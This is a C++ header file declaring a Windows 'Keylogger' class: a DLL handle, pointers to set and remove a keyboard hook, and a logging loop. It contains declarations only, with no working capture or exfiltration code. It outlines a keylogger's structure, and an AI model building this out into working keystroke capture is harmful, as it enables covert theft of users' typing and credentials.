#pragma once
#define WIN32_LEAN_AND_MEAN
#include <Windows.h>

typedef VOID(*SetHook)();
typedef VOID(*RemoveHook)();

class Keylogger
{
	HMODULE keylog_dll;
	static SetHook SetKeyBoardHook;
	RemoveHook RemoveKeyBoardHook;
	static void keylog_loop();
public:
	Keylogger();
	~Keylogger();
};